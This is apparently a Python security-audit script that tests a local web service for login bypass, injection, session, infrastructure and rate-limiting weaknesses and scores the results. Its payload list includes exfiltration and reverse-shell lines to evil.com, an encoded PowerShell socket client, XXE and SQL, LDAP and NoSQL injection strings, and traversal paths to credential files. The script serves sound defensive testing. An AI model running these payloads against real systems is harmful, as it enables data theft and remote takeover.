"""
Comprehensive Security Audit - Final Security Assessment
Tests ALL security aspects to determine if system is truly secure
"""
import requests
import time
import json
import threading
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class ComprehensiveSecurityAudit:
    def __init__(self, target_url="http://127.0.0.1:8000"):
        self.target_url = target_url
        self.token = None
        self.vulnerabilities = []
        self.security_score = 0
        self.total_tests = 0
        self.passed_tests = 0
        
    def login(self):
        """Authenticate to system"""
        try:
            response = requests.post(f"{self.target_url}/auth/login", 
                                   json={"username": "admin", "password": "admin123"})
            if response.status_code == 200:
                self.token = response.json().get("access_token")
                return True
        except:
            pass
        return False
    
    def test_authentication_security(self):
        """Test authentication vulnerabilities"""
        print("🔐 Testing Authentication Security...")
        
        tests = [
            # SQL Injection in login
            {"username": "admin' OR '1'='1' --", "password": "anything"},
            {"username": "admin", "password": "' OR '1'='1' --"},
            
            # NoSQL Injection
            {"username": {"$ne": None}, "password": {"$ne": None}},
            
            # LDAP Injection
            {"username": "admin)(&(password=*))", "password": "anything"},
            
            # Brute force attempts
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin"},
        ]
        
        bypassed = 0
        for test in tests:
            try:
                response = requests.post(f"{self.target_url}/auth/login", json=test, timeout=5)
                if response.status_code == 200:
                    bypassed += 1
                    self.vulnerabilities.append(f"Authentication bypass: {test}")
            except:
                pass
        
        self.total_tests += len(tests)
        self.passed_tests += (len(tests) - bypassed)
        
        if bypassed == 0:
            print("   ✅ Authentication security: SECURE")
            return True
        else:
            print(f"   ❌ Authentication bypassed: {bypassed} times")
            return False
    
    def test_injection_vulnerabilities(self):
        """Test all injection attack types"""
        print("💉 Testing Injection Vulnerabilities...")
        
        # Advanced injection payloads
        payloads = [
            # SQL Injection - Advanced
            "'; WAITFOR DELAY '00:00:05'; --",
            "' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
            "' UNION SELECT @@version, user_name(), db_name() --",
            
            # XSS - Advanced
            "<img src=x onerror=fetch('/api/stats').then(r=>r.text()).then(d=>fetch('http://evil.com?data='+btoa(d)))>",
            "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # Command Injection - Advanced
            "; powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkA",
            "&& curl -X POST http://evil.com/exfiltrate -d @/etc/passwd",
            "| nc -e /bin/sh evil.com 4444",
            
            # Template Injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            
            # XXE Injection
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            
            # LDAP Injection
            "*)(uid=*))(|(uid=*",
            "*)(|(objectClass=*))",
        ]
        
        blocked = 0
        detected = 0
        
        for payload in payloads:
            try:
                headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
                response = requests.post(f"{self.target_url}/api/analyze", 
                                       json={"input": payload}, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    analysis = data.get("analysis", {})
                    
                    if analysis.get("blocked", False):
                        blocked += 1
                    elif analysis.get("threat", False):
                        detected += 1
                    else:
                        self.vulnerabilities.append(f"Undetected injection: {payload[:50]}...")
                        
            except:
                pass
        
        self.total_tests += len(payloads)
        self.passed_tests += blocked
        
        detection_rate = ((blocked + detected) / len(payloads)) * 100
        block_rate = (blocked / len(payloads)) * 100
        
        print(f"   Detection Rate: {detection_rate:.1f}%")
        print(f"   Block Rate: {block_rate:.1f}%")
        
        if block_rate > 80:
            print("   ✅ Injection protection: EXCELLENT")
            return True
        elif block_rate > 60:
            print("   🟡 Injection protection: GOOD")
            return True
        else:
            print("   ❌ Injection protection: POOR")
            return False
    
    def test_business_logic_flaws(self):
        """Test business logic vulnerabilities"""
        print("🧠 Testing Business Logic Flaws...")
        
        flaws_found = 0
        
        # Test 1: Privilege escalation
        try:
            headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
            response = requests.get(f"{self.target_url}/api/threats", headers=headers)
            if response.status_code != 200:
                print("   ✅ Privilege escalation: Protected")
            else:
                flaws_found += 1
                self.vulnerabilities.append("Privilege escalation possible")
        except:
            pass
        
        # Test 2: Information disclosure
        endpoints = ["/api/stats", "/metrics", "/health", "/api/threats"]
        for endpoint in endpoints:
            try:
                response = requests.get(f"{self.target_url}{endpoint}")
                if response.status_code == 200 and "password" in response.text.lower():
                    flaws_found += 1
                    self.vulnerabilities.append(f"Information disclosure: {endpoint}")
            except:
                pass
        
        # Test 3: Rate limiting bypass
        try:
            requests_sent = 0
            for i in range(20):
                headers = {"X-Forwarded-For": f"192.168.1.{i}", "User-Agent": f"Bot{i}"}
                if self.token:
                    headers["Authorization"] = f"Bearer {self.token}"
                
                response = requests.post(f"{self.target_url}/api/analyze", 
                                       json={"input": "test"}, headers=headers, timeout=2)
                if response.status_code == 200:
                    requests_sent += 1
            
            if requests_sent > 15:
                flaws_found += 1
                self.vulnerabilities.append("Rate limiting bypass possible")
        except:
            pass
        
        self.total_tests += 4
        self.passed_tests += (4 - flaws_found)
        
        if flaws_found == 0:
            print("   ✅ Business logic: SECURE")
            return True
        else:
            print(f"   ❌ Business logic flaws: {flaws_found}")
            return False
    
    def test_session_management(self):
        """Test session and token security"""
        print("🎫 Testing Session Management...")
        
        issues = 0
        
        # Test 1: Token validation
        fake_tokens = [
            "fake_token",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid",
            base64.b64encode(b"admin:999999999").decode(),
            ""
        ]
        
        for token in fake_tokens:
            try:
                headers = {"Authorization": f"Bearer {token}"}
                response = requests.post(f"{self.target_url}/api/analyze", 
                                       json={"input": "test"}, headers=headers)
                if response.status_code == 200:
                    issues += 1
                    self.vulnerabilities.append(f"Invalid token accepted: {token[:20]}...")
            except:
                pass
        
        # Test 2: Session fixation
        if self.token:
            try:
                # Try to use token from different IP
                headers = {
                    "Authorization": f"Bearer {self.token}",
                    "X-Forwarded-For": "192.168.1.100"
                }
                response = requests.post(f"{self.target_url}/api/analyze", 
                                       json={"input": "test"}, headers=headers)
                # This should ideally be blocked or flagged
            except:
                pass
        
        self.total_tests += len(fake_tokens) + 1
        self.passed_tests += (len(fake_tokens) + 1 - issues)
        
        if issues == 0:
            print("   ✅ Session management: SECURE")
            return True
        else:
            print(f"   ❌ Session issues: {issues}")
            return False
    
    def test_infrastructure_security(self):
        """Test infrastructure and configuration security"""
        print("🏗️ Testing Infrastructure Security...")
        
        issues = 0
        
        # Test 1: Information disclosure in headers
        try:
            response = requests.get(self.target_url)
            headers = response.headers
            
            dangerous_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in dangerous_headers:
                if header in headers:
                    issues += 1
                    self.vulnerabilities.append(f"Information disclosure in header: {header}")
        except:
            pass
        
        # Test 2: HTTP methods
        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS']
        for method in dangerous_methods:
            try:
                response = requests.request(method, self.target_url, timeout=5)
                if response.status_code not in [405, 501]:
                    issues += 1
                    self.vulnerabilities.append(f"Dangerous HTTP method allowed: {method}")
            except:
                pass
        
        # Test 3: Directory traversal
        paths = [
            "/../../../etc/passwd",
            "/..\\..\\..\\windows\\system32\\config\\sam",
            "/.env",
            "/config.json",
            "/backup.sql"
        ]
        
        for path in paths:
            try:
                response = requests.get(f"{self.target_url}{path}")
                if response.status_code == 200 and len(response.text) > 100:
                    issues += 1
                    self.vulnerabilities.append(f"Directory traversal: {path}")
            except:
                pass
        
        self.total_tests += 3 + len(dangerous_methods) + len(paths)
        self.passed_tests += (3 + len(dangerous_methods) + len(paths) - issues)
        
        if issues == 0:
            print("   ✅ Infrastructure security: SECURE")
            return True
        else:
            print(f"   ❌ Infrastructure issues: {issues}")
            return False
    
    def test_ddos_resilience(self):
        """Test DDoS protection"""
        print("💥 Testing DDoS Resilience...")
        
        # Quick DDoS test
        blocked_requests = 0
        total_requests = 30
        
        def send_request():
            try:
                headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
                response = requests.post(f"{self.target_url}/api/analyze", 
                                       json={"input": "ddos_test"}, headers=headers, timeout=2)
                return response.status_code == 429  # Too Many Requests
            except:
                return False
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_request) for _ in range(total_requests)]
            blocked_requests = sum(f.result() for f in futures)
        
        self.total_tests += 1
        
        block_rate = (blocked_requests / total_requests) * 100
        
        if block_rate > 20:
            print(f"   ✅ DDoS protection: ACTIVE ({block_rate:.1f}% blocked)")
            self.passed_tests += 1
            return True
        else:
            print(f"   ❌ DDoS protection: WEAK ({block_rate:.1f}% blocked)")
            self.vulnerabilities.append("No DDoS protection detected")
            return False
    
    def run_comprehensive_audit(self):
        """Run complete security audit"""
        print("🔍 COMPREHENSIVE SECURITY AUDIT")
        print("=" * 60)
        print("⚠️ FINAL SECURITY ASSESSMENT")
        print("🎯 Testing ALL security aspects")
        print("=" * 60)
        
        # Login
        if self.login():
            print("✅ Authentication successful\n")
        else:
            print("⚠️ Authentication failed - limited testing\n")
        
        # Run all security tests
        tests = [
            ("Authentication Security", self.test_authentication_security),
            ("Injection Vulnerabilities", self.test_injection_vulnerabilities),
            ("Business Logic Flaws", self.test_business_logic_flaws),
            ("Session Management", self.test_session_management),
            ("Infrastructure Security", self.test_infrastructure_security),
            ("DDoS Resilience", self.test_ddos_resilience),
        ]
        
        results = {}
        for test_name, test_func in tests:
            print(f"\n--- {test_name} ---")
            results[test_name] = test_func()
        
        # Calculate final security score
        if self.total_tests > 0:
            self.security_score = (self.passed_tests / self.total_tests) * 100
        
        # Print comprehensive results
        self.print_final_assessment(results)
        
        return self.security_score
    
    def print_final_assessment(self, results):
        """Print final security assessment"""
        print("\n" + "=" * 60)
        print("🏆 FINAL SECURITY ASSESSMENT")
        print("=" * 60)
        
        # Test results
        print("📊 TEST RESULTS:")
        for test_name, passed in results.items():
            status = "✅ PASS" if passed else "❌ FAIL"
            print(f"   {test_name}: {status}")
        
        # Overall score
        print(f"\n🎯 OVERALL SECURITY SCORE: {self.security_score:.1f}%")
        print(f"📈 Tests Passed: {self.passed_tests}/{self.total_tests}")
        
        # Security rating
        if self.security_score >= 95:
            rating = "🟢 EXCELLENT - System is highly secure"
            recommendation = "✅ System ready for production"
        elif self.security_score >= 85:
            rating = "🟡 GOOD - Minor security improvements needed"
            recommendation = "⚠️ Address minor issues before production"
        elif self.security_score >= 70:
            rating = "🟠 MODERATE - Significant security gaps exist"
            recommendation = "🔧 Major security improvements required"
        else:
            rating = "🔴 POOR - System has critical vulnerabilities"
            recommendation = "🚨 DO NOT deploy to production"
        
        print(f"🏅 SECURITY RATING: {rating}")
        print(f"💡 RECOMMENDATION: {recommendation}")
        
        # Vulnerabilities
        if self.vulnerabilities:
            print(f"\n⚠️ VULNERABILITIES FOUND ({len(self.vulnerabilities)}):")
            for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                print(f"   {i}. {vuln}")
            
            if len(self.vulnerabilities) > 10:
                print(f"   ... and {len(self.vulnerabilities) - 10} more")
        
        # Final verdict
        print("\n" + "=" * 60)
        if self.security_score >= 85:
            print("🛡️ VERDICT: SYSTEM IS SECURE")
            print("✅ Safe to deploy with current security measures")
        else:
            print("🚨 VERDICT: SYSTEM IS NOT SECURE")
            print("❌ DO NOT deploy without addressing vulnerabilities")
        print("=" * 60)

if __name__ == "__main__":
    auditor = ComprehensiveSecurityAudit()
    final_score = auditor.run_comprehensive_audit()
    
    # Save detailed report
    report = {
        "audit_date": datetime.now().isoformat(),
        "security_score": final_score,
        "vulnerabilities": auditor.vulnerabilities,
        "total_tests": auditor.total_tests,
        "passed_tests": auditor.passed_tests
    }
    
    with open("comprehensive_security_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n📄 Detailed report saved to: comprehensive_security_report.json")